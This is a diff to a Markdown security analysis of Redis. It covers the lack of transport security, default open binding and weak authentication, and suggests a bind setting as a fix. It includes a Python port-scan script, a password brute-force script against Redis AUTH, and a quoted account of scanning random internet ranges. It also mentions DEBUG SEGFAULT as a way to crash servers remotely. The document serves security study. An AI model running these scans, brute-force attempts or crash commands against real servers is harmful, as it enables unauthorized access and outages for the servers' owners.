@@ -16,11 +16,99 @@ Because of the popularity of Redis that it is used in a wide variety of applicat
 
 ### Security Model
 
-> In general, Redis is not optimized for maximum security but for maximum performance and simplicity.
+> Redis is designed to be accessed by trusted clients inside trusted environments.... In general, Redis is not optimized for maximum security but for maximum performance and simplicity...
 
-In this section, I will first summarize the security model of Redis.
+In this section, I will examine Redis in different aspects concerned with application security. 
 
-##### 1. Security Model
+#### 1. Network Security
+
+##### 1.1 Model
+
+According to [Redis Protocol specification](http://redis.io/topics/protocol), Redis communication protocol is a simple plain-text mechanism. The redis server starts to run by creating a TCP connection to the port 6379.
+
+![redis-server](./pics/redis-server.png)
+
+In the context of Redis the protocol is only used with TCP connections, offering no transport layer security. Because of this, all access to the Redis server port should be denied except for "trusted clients inside trusted environments". 
+
+Ideally Redis is deployed in firewall secured locations or listening so only on server processes can talk to them. With the drive of cloud based services its possible to assemble an application of any scale very quickly. 
+
+##### 1.2 Vulnerabilities
+
+By default, redis listens on all available IP addresses on port 6379, with no configuration required at all. No configuration by default is a normal state of NoSQL databases if you downloaded the software and installed it yourself. This is convenient for developers, however, sometimes in doing so developers may forget about the need for configuration.
+
+Below is a scanning script I will use as a demonstration:
+
+```python
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+import sys
+import nmap
+
+rhost = '127.0.0.1'
+rport = 6379
+# Use nmap to scan default port number
+print "[-] Start to run port scanning"
+nm = nmap.PortScanner()
+response = nm.scan(rhost, rport)
+
+product_info = response['scan'][rhost]['tcp'][rport]
+if product_info['state'] == 'open':
+    print "[-] Redis server is running on default port"
+```
+
+I predict that by change the specific IP address from the localhost to any network and its sub-network (/24) ranges, this script can get a lot of misconfigured Redis server addresses. 
+
+##### 1.3 Suggestions
+In order to secure network security, we can bind the Redis server to a single interface by modifying the `redis.conf` file:
+
+```bash
+bind 127.0.0.1
+```
+
+#### Authentication Model
+
+Redis stores the password in the `redis.conf` file. By default, no authentication is required. To enable the authentication feature, we need to edit the `redis.conf` file. After that, Redis server will refuse any query by unauthenticated clients. 
+
+![redis-server](./pics/no-auth.png)
+
+Redis has a weak password storage method - the password is set in clear text. It provides a huge opportunities for brute force attack. Below is the script that I use to do a brute force attack:
+
+```python
+import redis
+from redis import exceptions
+import string
+try:
+    import pwddict
+except:
+    try:
+        sys.path.append('.')
+        import pwddict
+    except:
+        sys.exit(2)
+        
+# generates word list
+rpwd = ''
+p = pwddict.SimpleEngine(string_length=4)
+for password in p.generator():
+    try:
+        pwd = ''.join(password)
+        print "[-] Try password {0}".format(pwd)
+        r = redis.Redis(host=rhost, port=rport, db=0, password=pwd)
+        r.set("foot", "bar")
+        if r.get("foot") == "bar":
+            rpwd = pwd
+            break;
+    except exceptions.ResponseError:
+        print "[-] Failed to auth by redis server."
+        continue
+
+print "Success to crack the auth, password is {0}".format(rpwd)
+```
+
+#### String Escaping and NoSQL Injection
+
+
 
 ##### Source Code Security Model
 
@@ -76,13 +164,9 @@ and not to other users or processes.
 
 Reference [1](https://www.owasp.org/index.php/Improper_temp_file_opening),  [2](https://www.owasp.org/index.php/Insecure_Temporary_File)
 
-##### Network Security Model
-
-Redis is designed to be accessed by trusted clients inside trusted environments. This means that usually it is not a good idea to expose the Redis instance directly to the internet or, in general, to an environment where untrusted clients can directly access the Redis TCP port or UNIX socket.
-
 ### References
 
-The Redis protocol is a simple plain-text mechanism, offering no transport layer security. This is a problem in itself, but it gets worse. By default, it listens on all available IP addresses on port 6379, with no authentication required at all. So, as you might imagine, quite a few of these servers end up facing the internet. So, I decided to see if I could find any. I wrote up a quick script to scan random /24 ranges for Redis installations, and was amazed at the result. From a single day’s scanning, I found 48 open servers. What’s worse, two of them are major household-name websites – both of which were using Redis to store their page content. Obviously both of these companies have been contacted.
+The Redis protocol is a simple plain-text mechanism,  This is a problem in itself, but it gets worse.  So, as you might imagine, quite a few of these servers end up facing the internet. So, I decided to see if I could find any. I wrote up a quick script to scan random /24 ranges for Redis installations, and was amazed at the result. From a single day’s scanning, I found 48 open servers. What’s worse, two of them are major household-name websites – both of which were using Redis to store their page content. Obviously both of these companies have been contacted.
 
 It gets even worse, though. Redis allows you to send a DEBUG SEGFAULT command, which purposefully crashes the server. This means you can take down any Redis installation remotely. Nasty stuff.
 
